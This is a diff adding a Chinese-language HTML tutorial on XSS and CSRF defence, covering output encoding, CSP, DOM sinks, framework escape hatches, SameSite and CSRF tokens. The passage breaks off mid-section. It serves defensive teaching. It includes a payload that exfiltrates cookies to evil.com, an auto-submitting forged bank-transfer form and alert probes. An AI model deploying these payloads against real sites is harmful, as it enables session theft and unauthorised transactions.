@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>二十分钟学透 XSS 与 CSRF 攻防</title>
+<style>
+:root{
+  --bg:#F7F7F5; --card:#FFFFFF; --ink:#1A1A18; --muted:#6B6B66; --faint:#9A9A93;
+  --line:#E4E3DE; --accent:#185FA5; --accent-soft:#E6F1FB;
+  --ok:#0F6E56; --ok-soft:#E1F5EE; --warn:#854F0B; --warn-soft:#FAEEDA;
+  --danger:#A32D2D; --danger-soft:#FCEBEB; --violet:#534AB7; --violet-soft:#EEEDFE;
+  --code:#F1EFE8; --radius:12px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;scroll-padding-top:70px}
+body{background:var(--bg);color:var(--ink);font-family:system-ui,-apple-system,"Segoe UI","Microsoft YaHei",sans-serif;font-size:15px;line-height:1.7;-webkit-font-smoothing:antialiased}
+code,pre,.mono{font-family:ui-monospace,"Cascadia Code",Consolas,"Courier New",monospace}
+#bar{position:fixed;top:0;left:0;height:3px;width:0;background:var(--accent);z-index:99;transition:width .1s linear}
+header{background:var(--card);border-bottom:1px solid var(--line);padding:44px 24px 34px}
+.wrap{max-width:900px;margin:0 auto;padding:0 24px}
+.serie{display:inline-block;font-size:12px;font-weight:600;letter-spacing:.5px;color:var(--violet);background:var(--violet-soft);padding:3px 11px;border-radius:999px;margin-bottom:14px}
+.density{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
+.chip{font-size:12px;color:var(--muted);background:var(--bg);border:1px solid var(--line);border-radius:999px;padding:3px 11px}
+.chip b{color:var(--accent);font-weight:600}
+h1{font-size:29px;font-weight:600;letter-spacing:-.4px;line-height:1.3}
+.sub{color:var(--muted);margin-top:10px;font-size:15px}
+.sub b{color:var(--ink);font-weight:500}
+.timerbox{display:flex;align-items:center;gap:18px;flex-wrap:wrap;margin-top:24px;padding:16px 20px;background:var(--bg);border:1px solid var(--line);border-radius:var(--radius)}
+#clock{font-size:34px;font-weight:600;font-variant-numeric:tabular-nums;letter-spacing:1px;color:var(--accent);min-width:118px}
+#clock.done{color:var(--danger)}
+.btn{border:1px solid var(--line);background:var(--card);color:var(--ink);padding:7px 16px;border-radius:8px;font-size:14px;cursor:pointer;font-family:inherit;transition:.15s}
+.btn:hover{border-color:var(--accent);color:var(--accent)}
+.btn.primary{background:var(--accent);color:#fff;border-color:var(--accent)}
+.btn.primary:hover{opacity:.88;color:#fff}
+.timerhint{font-size:13px;color:var(--faint);flex:1;min-width:180px}
+main{padding:36px 0 80px}
+section{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:28px 30px;margin-bottom:20px}
+.shead{display:flex;align-items:center;gap:12px;margin-bottom:6px;flex-wrap:wrap}
+.mins{font-size:12px;font-weight:600;padding:3px 11px;border-radius:999px;background:var(--accent-soft);color:var(--accent);letter-spacing:.3px;white-space:nowrap}
+h2{font-size:20px;font-weight:600;letter-spacing:-.2px}
+h3{font-size:15px;font-weight:600;margin:22px 0 8px}
+h3:first-of-type{margin-top:16px}
+h4{font-size:14px;font-weight:600;margin:16px 0 4px;color:var(--muted)}
+p{color:#3A3A36;margin-top:10px}
+p.lead{color:var(--muted)}
+ul,ol{margin:10px 0 0 20px;color:#3A3A36}
+li{margin:6px 0}
+li::marker{color:var(--faint)}
+strong{font-weight:600;color:var(--ink)}
+.k{background:var(--code);border:1px solid var(--line);border-radius:5px;padding:1px 6px;font-size:13px;color:#7A3E00}
+pre{background:#2C2C2A;color:#E8E6E1;padding:14px 16px;border-radius:10px;overflow-x:auto;font-size:13px;line-height:1.65;margin-top:12px}
+pre .c{color:#8A8A82}
+pre .g{color:#9FE1CB}
+pre .y{color:#FAC775}
+pre .b{color:#85B7EB}
+pre .r{color:#F09595}
+.callout{border-left:3px solid var(--accent);background:var(--accent-soft);padding:12px 16px;border-radius:0 8px 8px 0;margin-top:16px;font-size:14px;color:#0C447C}
+.callout.warn{border-color:var(--warn);background:var(--warn-soft);color:#412402}
+.callout.ok{border-color:var(--ok);background:var(--ok-soft);color:#04342C}
+.callout.danger{border-color:var(--danger);background:var(--danger-soft);color:#501313}
+.callout b{font-weight:600}
+table{width:100%;border-collapse:collapse;margin-top:14px;font-size:14px;table-layout:fixed}
+th{text-align:left;font-weight:600;font-size:13px;color:var(--muted);padding:9px 12px;border-bottom:1px solid var(--line);background:var(--bg)}
+td{padding:11px 12px;border-bottom:1px solid var(--line);vertical-align:top;color:#3A3A36}
+tr:last-child td{border-bottom:none}
+td.f{font-family:ui-monospace,Consolas,monospace;font-size:12.5px;color:#7A3E00;word-break:break-all}
+.cmds{display:flex;flex-direction:column;gap:8px;margin-top:14px}
+.crow{display:flex;align-items:center;gap:12px;padding:10px 14px;background:var(--bg);border:1px solid var(--line);border-radius:9px;flex-wrap:wrap}
+.crow code{background:var(--code);border:1px solid var(--line);border-radius:5px;padding:3px 8px;font-size:13px;color:#7A3E00;white-space:nowrap;overflow-x:auto;max-width:100%}
+.crow .desc{font-size:13.5px;color:var(--muted);flex:1;min-width:150px}
+.copy{border:1px solid var(--line);background:var(--card);border-radius:6px;padding:3px 10px;font-size:12px;cursor:pointer;color:var(--muted);font-family:inherit}
+.copy:hover{border-color:var(--accent);color:var(--accent)}
+.copy.ok{border-color:var(--ok);color:var(--ok)}
+.steps{counter-reset:s;margin-top:14px}
+.step{display:flex;gap:14px;padding:12px 0;border-bottom:1px dashed var(--line)}
+.step:last-child{border-bottom:none}
+.step::before{counter-increment:s;content:counter(s);flex:0 0 26px;height:26px;border-radius:50%;background:var(--accent);color:#fff;font-size:13px;font-weight:600;display:flex;align-items:center;justify-content:center}
+.step .txt{flex:1;font-size:14.5px;color:#3A3A36}
+.step .txt b{color:var(--ink)}
+.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:12px;margin-top:14px}
+.card{background:var(--bg);border:1px solid var(--line);border-radius:10px;padding:14px 16px}
+.card .ct{font-size:14px;font-weight:600;margin-bottom:5px;display:flex;align-items:center;gap:7px}
+.card .cd{font-size:13.5px;color:var(--muted);line-height:1.6}
+.dot{width:8px;height:8px;border-radius:50%;flex:0 0 8px}
+.quiz{margin-top:14px}
+.q{border:1px solid var(--line);border-radius:10px;padding:14px 16px;margin-bottom:10px}
+.q .qt{font-size:14.5px;font-weight:600;margin-bottom:8px}
+.opt{display:block;width:100%;text-align:left;padding:8px 12px;margin:5px 0;border:1px solid var(--line);background:var(--card);border-radius:8px;font-size:14px;cursor:pointer;font-family:inherit;color:#3A3A36;transition:.15s}
+.opt:hover{border-color:var(--accent)}
+.opt.right{border-color:var(--ok);background:var(--ok-soft);color:#04342C}
+.opt.wrong{border-color:var(--danger);background:var(--danger-soft);color:#501313}
+.ans{font-size:13.5px;color:var(--muted);margin-top:8px;display:none}
+.ans.show{display:block}
+.pit{display:flex;gap:14px;padding:14px 0;border-bottom:1px dashed var(--line)}
+.pit:last-child{border-bottom:none}
+.pit .num{flex:0 0 28px;height:28px;border-radius:8px;background:var(--danger-soft);color:var(--danger);font-size:13px;font-weight:600;display:flex;align-items:center;justify-content:center}
+.pit .pb{flex:1}
+.pit .pt{font-size:14.5px;font-weight:600}
+.pit .pd{font-size:13.5px;color:var(--muted);margin-top:3px}
+footer{text-align:center;color:var(--faint);font-size:13px;padding:0 24px 50px}
+@media(max-width:600px){
+  h1{font-size:23px} section{padding:22px 18px} header{padding:32px 0 26px}
+  .wrap{padding:0 16px} table{font-size:13px;table-layout:auto}
+  th,td{padding:8px 8px}
+}
+</style>
+</head>
+<body>
+<div id="bar"></div>
+
+<header>
+  <div class="wrap">
+    <span class="serie">十分钟系列 · 第 24 期 · 高密度版</span>
+    <h1>二十分钟学透 XSS 与 CSRF 攻防</h1>
+    <p class="sub">XSS 和 CSRF 是浏览器安全模型的两朵"并蒂莲"：<b>XSS 让攻击者的脚本跑在你的页面里</b>（同源策略失效），<b>CSRF 让浏览器替攻击者带上你的身份</b>（Cookie 自动携带）。这篇讲清两类漏洞的机制、输出编码的上下文规则、CSP 的正确用法，以及 CSRF 各防御方案的边界。</p>
+    <div class="density">
+      <span class="chip">覆盖 <b>8</b> 大模块</span>
+      <span class="chip"><b>3</b> 类 XSS</span>
+      <span class="chip"><b>5</b> 种编码上下文</span>
+      <span class="chip"><b>10</b> 个坑</span>
+      <span class="chip"><b>6</b> 道自测</span>
+    </div>
+    <div class="timerbox">
+      <div id="clock">20:00</div>
+      <button class="btn primary" id="start">开始计时</button>
+      <button class="btn" id="reset">重置</button>
+      <span class="timerhint" id="hint">建议边读边打开浏览器 DevTools 试 innerHTML / textContent 的差异</span>
+    </div>
+  </div>
+</header>
+
+<main class="wrap">
+
+<section id="s0">
+  <div class="shead"><span class="mins">开始前</span><h2>两个漏洞的共同根源：浏览器替你做主</h2></div>
+  <p class="lead">理解 XSS 和 CSRF，先理解浏览器的两条"贴心设计"—— 它们既是便利的根源，也是漏洞的根源。</p>
+  <table>
+    <tr><th style="width:230px">浏览器机制</th><th style="width:250px">带来了什么便利</th><th>被滥用后变成</th></tr>
+    <tr><td><b>Cookie 随请求自动携带</b></td><td>登录一次，整个会话期间所有请求自动带上身份</td><td><b>CSRF</b>：攻击者的站点诱导你的浏览器发请求，Cookie 照带不误</td></tr>
+    <tr><td><b>同源策略内脚本互信</b></td><td>同源页面里的 JS 可以读写页面 DOM、发同源请求</td><td><b>XSS</b>：攻击者脚本注入你的页面，获得同源身份，为所欲为</td></tr>
+  </table>
+  <div class="callout warn">
+    <b>关于 payload 的边界：</b>本文的攻击 payload 只用于防御教学，目的是理解"浏览器的哪条机制被绕过了"。禁止在未授权系统上使用。<b>验证防护请用自己本地的测试页面</b>，或者 <span class="k">alert(document.domain)</span> 这类无害探针。
+  </div>
+  <div class="callout">
+    <b>一条贯穿全篇的主线：</b>XSS 的所有防御（输出编码、CSP、HttpOnly）都在回答"<b>我的页面里能跑什么代码</b>"；CSRF 的所有防御（SameSite、Token、Origin 校验）都在回答"<b>这个请求是不是用户本人意图</b>"。两类问题、两套防线，但经常被混为一谈。
+  </div>
+</section>
+
+<section id="s1">
+  <div class="shead"><span class="mins">模块 1</span><h2>XSS 三类形态与利用链</h2></div>
+  <p class="lead">按"恶意脚本存在哪里、怎么到达浏览器"分成三类。区分它们很重要：<b>存储型和反射型的防线在服务端，DOM 型的防线在前端。</b></p>
+  <table>
+    <tr><th style="width:110px">类型</th><th style="width:250px">恶意脚本的位置与路径</th><th>典型场景</th></tr>
+    <tr><td><b>存储型</b></td><td>脚本被存进数据库 / 文件 / 日志，<b>所有访问受影响页面的用户都会中招</b></td><td>评论、昵称、商品名、IM 消息、工单标题</td></tr>
+    <tr><td><b>反射型</b></td><td>脚本在 URL / 表单参数里，服务端<strong>未转义就拼进响应</strong>，需要诱导用户点链接</td><td>搜索结果页回显关键词、错误提示页、邮件中的跟踪链接</td></tr>
+    <tr><td><b>DOM 型</b></td><td>服务端响应完全干净，<b>前端 JS 把不可信数据（location.hash 等）写进 sink 时触发</b></td><td>前端路由解析、location.hash 读取渲染、postMessage 处理</td></tr>
+  </table>
+  <h4>存储型 XSS 的完整利用链（教学）</h4>
+  <pre><span class="c">// 第 1 步：注入。评论区提交带脚本的内容（被服务端原样入库）</span>
+评论内容：<span class="r">&lt;img src=x onerror="fetch('//evil.com/log?c='+document.cookie)"&gt;</span>
+
+<span class="c">// 第 2 步：触发。其他用户打开帖子页，服务端把评论原样输出到 HTML，</span>
+<span class="c">// 浏览器解析到 img 标签 → onerror 触发 → 脚本以"你的站点同源身份"运行</span>
+
+<span class="c">// 第 3 步：扩大。同源身份意味着：</span>
+<span class="c">//   · 读取页面内容（冒充用户操作：改密码、转账、删数据）</span>
+<span class="c">//   · 发同源 AJAX 请求，携带用户 Cookie</span>
+<span class="c">//   · 偷 CSRF Token：从 DOM 里读取 token 再发伪造请求（XSS 击穿 CSRF 防线）</span>
+<span class="c">//   · 改写页面钓鱼（伪造登录框骗密码）</span>
+
+<span class="c">// 第 4 步：蠕虫。存储型脚本可以让"访问者自动转发/评论同样内容"，</span>
+<span class="c">// 实现自我传播（2005 年 MySpace 的 Samy 蠕虫是标志性事件）</span></pre>
+  <div class="callout danger">
+    <b>HttpOnly 挡住了第一步，挡不住后面所有步。</b><span class="k">document.cookie</span> 读不到 HttpOnly 的 Cookie，但攻击者根本不需要偷 Cookie —— 他已经在你的页面里，直接用这个身份发请求、读页面、点按钮。<b>把 HttpOnly 当 XSS 的解药是经典误判。</b>
+  </div>
+  <div class="callout">
+    <b>危害排序（同条件下）：</b>存储型 &gt; DOM 型 ≈ 反射型。存储型影响全部用户且持续存在；反射型需要社工投递链接；DOM 型服务端日志甚至看不到异常请求（payload 在 <span class="k">#</span> fragment 里，根本不发往服务器）—— 这也是它容易被监控漏掉的原因。
+  </div>
+</section>
+
+<section id="s2">
+  <div class="shead"><span class="mins">模块 2</span><h2>输出编码：规则取决于上下文</h2></div>
+  <p class="lead">XSS 防御的核心是<b>输出编码</b>：数据在离开程序进入 HTML 的那一刻，按目标上下文转义。关键认知：<b>没有"一种通用转义"，只有"匹配上下文的转义"</b>。HTML 上下文安全的数据，放进 JS 上下文可能照样被执行。</p>
+  <table>
+    <tr><th style="width:140px">上下文</th><th style="width:260px">危险字符</th><th>正确编码方式</th></tr>
+    <tr><td><b>HTML 元素内容</b></td><td class="f">&lt; &gt; &amp;</td><td>实体编码：&amp;lt; &amp;gt; &amp;amp;（&lt; 变 &amp;lt; 后浏览器只渲染文本）</td></tr>
+    <tr><td><b>HTML 属性值</b></td><td class="f">&lt; &gt; &amp; " '</td><td>属性值必须用引号包裹，引号做实体编码；<b>属性名位置永远不要放不可信数据</b></td></tr>
+    <tr><td><b>JavaScript 上下文</b></td><td class="f">引号、反斜杠、换行、&lt;/script&gt;</td><td>\xHH / \uHHHH 十六进制转义；更优解是别把数据拼进行内 script —— 用 data 属性承载，前端读取时用 DOM API</td></tr>
+    <tr><td><b>URL 上下文</b></td><td class="f">javascript: 等协议注入</td><td>encodeURIComponent 编码；<b>并校验协议白名单</b>（只允许 http/https），否则 "javascript:alert(1)" 会通过 href 执行</td></tr>
+    <tr><td><b>CSS 上下文</b></td><td class="f">expression()、url()、转义序列</td><td>CSS 转义；避免把用户数据放进 style 属性；url() 里的数据同样要校验协议</td></tr>
+  </table>
+  <pre><span class="c"># Python：html.escape 覆盖 HTML 上下文（默认 quote=True 连引号一起转）</span>
+<span class="g">html.escape</span>(user_input)              <span class="c"># &lt; → &amp;lt;  &gt; → &amp;gt;  &amp; → &amp;amp;  " → &amp;quot;</span>
+<span class="c"># Flask 的 Jinja2 自动转义 {{ }} 插值；|safe 是显式关闭，慎用</span>
+
+<span class="c">// Java：用 OWASP Java Encoder 而不是自己写 replace</span>
+<span class="g">Encode.forHtml</span>(user_input)            <span class="c">// HTML 内容</span>
+<span class="g">Encode.forHtmlAttribute</span>(user_input)   <span class="c">// 属性值</span>
+<span class="g">Encode.forJavaScript</span>(user_input)      <span class="c">// JS 上下文</span>
+<span class="g">Encode.forUri</span>(user_input)             <span class="c">// URL 参数</span>
+<span class="c">// 为什么不用 StringEscapeUtils / 自己 replace：转义规则随上下文变化，</span>
+<span class="c">// 手写 replace 必然漏（比如漏了 &amp; 或单引号），用库按上下文调用</span>
+
+<span class="c">// Node / 前端：写文本用 textContent，不要用 innerHTML 拼字符串</span>
+el.textContent = userInput;    <span class="g">// 永远安全：文本节点，不解析 HTML</span>
+el.innerHTML = userInput;      <span class="r">// 危险：HTML 被解析，标签和事件属性全部生效</span></pre>
+  <div class="callout ok">
+    <b>框架白名单：</b>主流模板引擎默认转义 {{ }} 插值（Jinja2、Thymeleaf、EJS、Handlebars、React JSX、Vue 插值）。<b>"默认转义"只覆盖它认识的插值语法</b>——一旦你用字符串拼接绕过模板、或者用了引擎的"不转义"指令（|safe、v-html、dangerouslySetInnerHTML），保护立刻消失。模块 5 专门讲这些逃生舱。
+  </div>
+  <div class="callout danger">
+    <b>最常见的单点失误：JS 内联上下文。</b>后端模板里写 <span class="k">&lt;script&gt;var name = "{{ user.name }}";&lt;/script&gt;</span>，HTML 转义帮不了你 —— 攻击者输入 <span class="k">";alert(1);//</span>，引号闭合后就是任意 JS。<b>正确做法：数据放 data 属性（&lt;div data-name="..."&gt;），前端用 dataset 读取；或者 JSON 序列化后按 JS 上下文转义。</b>
+  </div>
+</section>
+<section id="s3">
+  <div class="shead"><span class="mins">模块 3</span><h2>CSP：第二层防线，用对才有效</h2></div>
+  <p class="lead">Content-Security-Policy 通过响应头告诉浏览器："这个页面只允许从这些来源加载脚本/样式/图片……"。它是<b>纵深防御的第二层</b>：输出编码漏了一个洞，CSP 有机会把 exploit 拦在加载阶段。</p>
+  <pre><span class="c"># 一条能用的基线策略（Nginx / Apache / 应用层加响应头）</span>
+<span class="b">Content-Security-Policy</span>: default-src <span class="y">'self'</span>; \
+  script-src <span class="y">'self'</span> https://cdn.example.com; \
+  style-src <span class="y">'self'</span> <span class="y">'unsafe-inline'</span>; \
+  img-src <span class="y">'self'</span> data:; \
+  connect-src <span class="y">'self'</span>; \
+  object-src <span class="y">'none'</span>; \
+  base-uri <span class="y">'self'</span>; \
+  frame-ancestors <span class="y">'none'</span>
+
+<span class="c"># 灰度期用 Report-Only：只报告不拦截，看报表再收紧</span>
+<span class="b">Content-Security-Policy-Report-Only</span>: policy; report-uri /csp-report</pre>
+  <h4>script-src 的三个进阶武器</h4>
+  <table>
+    <tr><th style="width:130px">机制</th><th style="width:260px">原理</th><th>适用与注意</th></tr>
+    <tr><td><b>nonce</b></td><td>每次响应生成一个随机数放头部，<b>只有 &lt;script nonce="同一个值"&gt; 才被执行</b>。攻击者猜不到 nonce，注入的脚本即使躲过编码也执行不了</td><td>适合服务端动态页面；<b>nonce 必须每次响应都换、且不可预测</b>，缓存页面要小心 nonce 被缓存复用</td></tr>
+    <tr><td><b>hash</b></td><td>对内联脚本内容做哈希，只有内容哈希匹配白名单的内联脚本才执行</td><td>适合少量固定内联脚本；脚本内容一改哈希就得更新</td></tr>
+    <tr><td><b>strict-dynamic</b></td><td>配合 nonce 使用：信任由"可信脚本"动态加载的后续脚本，不用把每个 CDN 都列出来</td><td>现代 CSP 的核心，Chrome 52+ 支持；老浏览器忽略该关键字时仍需保留来源白名单兜底</td></tr>
+  </table>
+  <div class="callout danger">
+    <b>CSP 的三个常见误用：</b><br>
+    ① <b>script-src 带 'unsafe-inline'</b>：等于允许所有内联脚本，XSS 防护基本归零 —— 很多站"有 CSP"但形同虚设，就是因为它。<br>
+    ② <b>把 CSP 当唯一防线</b>：CSP 可以被古老的浏览器不支持、被配置疏漏绕过（漏掉某个指令），它降低攻击成功率，不消灭漏洞。<b>输出编码仍是修复层。</b><br>
+    ③ <b>忘了 object-src 'none' 和 base-uri 'self'</b>：&lt;object&gt; / &lt;embed&gt; 可执行插件内容，&lt;base&gt; 可劫持相对 URL —— 这两条是严格 CSP 的标配。
+  </div>
+  <div class="callout ok">
+    <b>"严格 CSP"最小配方：</b><span class="k">object-src 'none'; base-uri 'self'; script-src 'nonce-{random}' 'strict-dynamic'</span>。Google 的 CSP Evaluator 可以给你的策略打分，上线前跑一遍。
+  </div>
+</section>
+
+<section id="s4">
+  <div class="shead"><span class="mins">模块 4</span><h2>DOM XSS：sink 与 source 清单</h2></div>
+  <p class="lead">DOM 型 XSS 完全发生在前端：<b>source（不可信数据入口）→ sink（执行/解析 HTML 的位置）</b>。服务端日志甚至看不到异常请求，因为 payload 常在 URL 的 # fragment 里，根本不会发到服务器。</p>
+  <table>
+    <tr><th style="width:220px">常见 source</th><th>常见 sink</th></tr>
+    <tr><td class="f">location.hash / location.search / location.href<br>document.referrer<br>window.name<br>postMessage 的 event.data<br>localStorage / URL 参数经前端路由解析</td><td class="f">innerHTML / outerHTML / insertAdjacentHTML<br>document.write / document.writeln<br>eval / new Function / setTimeout("字符串") / setInterval("字符串")<br>location = / location.href = / location.assign()<br>element.setAttribute("href", ...) 等可执行属性</td></tr>
+  </table>
+  <pre><span class="c">// 典型 DOM XSS：读取 URL fragment 直接写进 innerHTML</span>
+<span class="r">const q = location.hash.slice(1);</span>
+<span class="r">document.getElementById("result").innerHTML = "搜索：" + q;</span>
+<span class="c">// 构造 https://site.com/search#&lt;img src=x onerror=alert(1)&gt;</span>
+<span class="c">// fragment 不发往服务器，服务端一切正常，但浏览器执行了注入的脚本</span>
+
+<span class="c">// 修复：用 textContent，或白名单净化</span>
+<span class="g">document.getElementById("result").textContent = "搜索：" + q;</span>
+<span class="c">// 若确需渲染 HTML（富文本场景），用 DOMPurify 白名单净化后再赋值</span>
+<span class="g">el.innerHTML = DOMPurify.sanitize(q, {ALLOWED_TAGS: ["b","i","p"]});</span>
+
+<span class="c">// location 跳转同样要防：用户可控值直接赋值给 location.href</span>
+<span class="r">location.href = "/redirect?to=" + userInput;   // 内含 javascript: 协议即 XSS</span>
+<span class="g">// 修复：校验协议白名单</span>
+<span class="g">const url = new URL(userInput, location.origin);</span>
+<span class="g">if (["http:","https:"].includes(url.protocol)) location.href = url;</span></pre>
+  <div class="callout warn">
+    <b>为什么 setTimeout("字符串") 也是 sink：</b>字符串参数会被当作代码执行，等价于 eval。同样的坑还有 <span class="k">element.setAttribute("onclick", 用户数据)</span>、模板引擎的编译型 API（Vue 的 <span class="k">Vue.compile</span>、Handlebars 的 <span class="k">Handlebars.compile(用户模板)</span>）—— 用户可控内容进了"编译/执行"通道，就是代码执行。<b>判据：这个字符串最终会被谁当代码解析？</b>
+  </div>
+</section>
+
+<section id="s5">
+  <div class="shead"><span class="mins">模块 5</span><h2>框架自动转义与危险 API</h2></div>
+  <p class="lead">React / Vue / Angular 默认转义插值，这是好事；但它们都留了"渲染原始 HTML"的逃生舱 —— <b>漏洞清单上长长一串 XSS，几乎都藏在逃生舱里</b>。</p>
+  <table>
+    <tr><th style="width:110px">框架</th><th style="width:220px">安全默认（插值自动转义）</th><th>危险逃生舱</th></tr>
+    <tr><td><b>React</b></td><td class="f">{value} JSX 插值自动转义</td><td class="f">dangerouslySetInnerHTML={{__html: value}}<br>javascript: 协议的 href</td></tr>
+    <tr><td><b>Vue</b></td><td class="f">{{ value }} 插值自动转义</td><td class="f">v-html="value"</td></tr>
+    <tr><td><b>Angular</b></td><td class="f">{{ value }} 插值自动转义</td><td class="f">bypassSecurityTrustHtml / TrustScript / TrustStyle / TrustResourceUrl 系列</td></tr>
+    <tr><td><b>Svelte</b></td><td class="f">{@html} 之外的插值自动转义</td><td class="f">{@html value}</td></tr>
+  </table>
+  <pre><span class="c">// React：{{ }} 插值 vs dangerouslySetInnerHTML</span>
+&lt;div&gt;{userContent}&lt;/div&gt;                        <span class="g">// 安全：内容按文本渲染</span>
+&lt;div dangerouslySetInnerHTML={{__html: userContent}} /&gt;  <span class="r">// 危险：按 HTML 解析</span>
+
+<span class="c">// Vue：{{ }} vs v-html</span>
+&lt;div&gt;{{ userContent }}&lt;/div&gt;                      <span class="g">// 安全</span>
+&lt;div v-html="userContent"&gt;&lt;/div&gt;                    <span class="r">// 危险：等价于 innerHTML</span>
+
+<span class="c">// 确需渲染富文本（评论带格式、文章预览）时的正确姿势</span>
+<span class="g">import DOMPurify from "dompurify";</span>
+<span class="g">const clean = DOMPurify.sanitize(userHtml);</span>   <span class="c">// 白名单净化：只留安全标签/属性</span>
+&lt;div v-html="clean"&gt;&lt;/div&gt;</pre>
+  <div class="callout danger">
+    <b>逃生舱审计原则：</b>每出现一次 <span class="k">dangerouslySetInnerHTML</span> / <span class="k">v-html</span> / <span class="k">@html</span> / <span class="k">bypassSecurityTrust*</span>，必须能回答三个问题：数据来自哪、是否经过白名单净化、为什么不能用转义插值。<b>答不上来就改成 textContent。</b>仓库里全局搜这些关键字，每处都是一次代码评审。
+  </div>
+</section>
+
+<section id="s6">
+  <div class="shead"><span class="mins">模块 6</span><h2>CSRF 原理与 SameSite</h2></div>
+  <p class="lead">CSRF 的根因一句话：<b>Cookie 会自动随请求携带，而服务端分不清这个请求是用户本人点的，还是被伪造的。</b>攻击者甚至不需要读你的响应 —— 只要请求发出去、Cookie 带上、动作执行，他就赢了。</p>
+  <pre><span class="c">&lt;!-- 攻击者页面里埋一个自动提交的表单（教学示意） --&gt;</span>
+<span class="r">&lt;form action="https://bank.com/transfer" method="POST" id="f"&gt;</span>
+<span class="r">  &lt;input name="to" value="attacker"&gt;</span>
+<span class="r">  &lt;input name="amount" value="10000"&gt;</span>
+<span class="r">&lt;/form&gt;</span>
+<span class="r">&lt;script&gt;document.getElementById('f').submit()&lt;/script&gt;</span>
+<span class="c">// 已登录 bank.com 的用户打开这个页面 → 表单自动 POST →</span>
+<span class="c">// 浏览器自动附带 bank.com 的 Cookie → 服务端视为"用户本人操作"</span>
+<span class="c">// 更轻量的形态：&lt;img src="https://bank.com/logout"&gt; 就能打一个 GET 型动作</span>
+
+<span class="c">// 为什么同源策略不拦这个？</span>
+<span class="c">// 简单请求（表单提交、img/script 加载）不需要 CORS 预检，浏览器允许跨站发出；</span>
+<span class="c">// 同源策略只拦"读取响应"，不拦"发出请求" —— 而 CSRF 不需要读响应</span></pre>
+  <h4>SameSite Cookie 属性：浏览器层面的第一道闸</h4>
+  <table>
+    <tr><th style="width:130px">取值</th><th style="width:250px">行为</th><th>适用</th></tr>
+    <tr><td class="f">SameSite=Strict</td><td><b>任何跨站请求都不带该 Cookie</b>（包括从外部链接点进站点）</td><td>安全性最高；代价：从聊天软件点链接首次进入时未登录态，需再登录一次</td></tr>
+    <tr><td class="f">SameSite=Lax</td><td>跨站<b>不携带</b>，但顶级导航的 GET 请求例外（点链接进入会带）</td><td><b>现代浏览器默认值（Chrome 80+）</b>，安全与体验的平衡点</td></tr>
+    <tr><td class="f">SameSite=None</td><td>跨站也携带。<b>必须同时加 Secure</b>（否则浏览器拒绝）</td><td>仅用于第三方嵌入式场景（跨站 iframe、SSO 回调），普通站点会话不要用</td></tr>
+  </table>
+  <pre><span class="c"># 会话 Cookie 的正确配置（Set-Cookie 响应头）</span>
+<span class="b">Set-Cookie</span>: session=abc123; <span class="y">HttpOnly</span>; <span class="y">Secure</span>; <span class="y">SameSite=Lax</span>; <span class="y">Path=/</span>; <span class="y">Max-Age=3600</span>
+<span class="c"># HttpOnly：JS 读不到，挡 XSS 偷 Cookie（注意：挡不住 XSS 的其他危害）</span>
+<span class="c"># Secure：只走 HTTPS，防中间人窃听</span>
+<span class="c"># SameSite=Lax：跨站 POST 天然不带 Cookie，CSRF 成本大幅上升</span>
+<span class="c"># Path=/ 与 Max-Age：控制作用域与过期，别用默认的会话级 + 全局域</span></pre>
+  <div class="callout warn">
+    <b>SameSite 不是万能药：</b>① 老浏览器不支持该属性（Safari 早期版本、IE 全系），攻击面仍在；② <span class="k">SameSite=Lax</span> 对<b>顶级 GET 导航放行</b>，任何"GET 请求就能改变状态"的接口（如 /logout、/delete?id=）在 Lax 下仍可被跨站触发 —— 这就是为什么<b>状态变更必须用 POST/PUT/DELETE</b>；③ Chrome 强制第三方 Cookie 淘汰的政策仍在演进，跨站场景要跟进变化。
+  </div>
+</section>
+<section id="s7">
+  <div class="shead"><span class="mins">模块 7</span><h2>CSRF 防御方案对比</h2></div>
+  <p class="lead">SameSite 是浏览器替你把的第一道关，服务端仍需要自己的防线。四种方案的取舍，是这篇里最实用的部分。</p>
+  <table>
+    <tr><th style="width:160px">方案</th><th style="width:250px">原理</th><th>优点 / 局限</th></tr>
+    <tr><td><b>Synchronizer Token</b></td><td>服务端为每个会话生成随机 token，表单带隐藏字段，服务端比对。<b>攻击者跨站读不到 token</b>（同源策略拦响应读取）</td><td>业界标准，可靠。需要服务端存储；要覆盖所有状态变更接口</td></tr>
+    <tr><td><b>双重提交 Cookie</b></td><td>无状态场景（JWT 认证）：服务端把随机值写进 Cookie，前端 JS 读取后放到自定义 Header（如 X-CSRF-Token），服务端比对两者一致性</td><td>不需要服务端存储。<b>前提：子域名干净</b>——任一子域被 XSS 都能写 Cookie 绕过；不如同步 token 强</td></tr>
+    <tr><td><b>自定义 Header 校验</b></td><td>要求所有状态变更请求带 X-Requested-With 等自定义 Header。<b>跨站简单请求加不了自定义 Header</b>（不加就触发 CORS 预检，预检过不了）</td><td>适合 AJAX 为主的架构，实现最轻。<b>纯表单/多页应用不适用</b></td></tr>
+    <tr><td><b>Origin / Referer 校验</b></td><td>服务端校验请求头里的来源是否为本站</td><td>零存储、实现快。<b>但不可单独依赖</b>：Referer 可能被浏览器策略裁剪、HTTPS→HTTP 跳转丢失、企业代理剥离；老浏览器没有 Origin 头。适合做附加校验</td></tr>
+  </table>
+  <pre><span class="c"># Synchronizer Token 的最小实现（Java 伪代码）</span>
+<span class="c">// 1. 登录后生成 token，存 session，并下发给页面</span>
+String token = <span class="g">SecureRandom</span>-based UUID;
+session.setAttribute("csrf", token);
+model.addAttribute("csrfToken", token);   <span class="c">// 模板渲染进表单隐藏域</span>
+
+<span class="c">// 2. 页面表单带 token</span>
+<span class="g">&lt;form action="/transfer" method="POST"&gt;</span>
+<span class="g">  &lt;input type="hidden" name="_csrf" value="${csrfToken}"&gt;</span>
+<span class="g">  ...</span>
+<span class="g">&lt;/form&gt;</span>
+
+<span class="c">// 3. 服务端每个状态变更接口校验</span>
+<span class="g">if (!token.equals(session.getAttribute("csrf"))) throw new CsrfException();</span>
+<span class="c">// 框架白名单：Spring Security、Django、Laravel、Rails 都内置该模式，</span>
+<span class="c">// 默认开启 —— 关掉它之前先读完文档</span>
+
+<span class="c"># 错误做法：token 放 URL 查询参数（GET）</span>
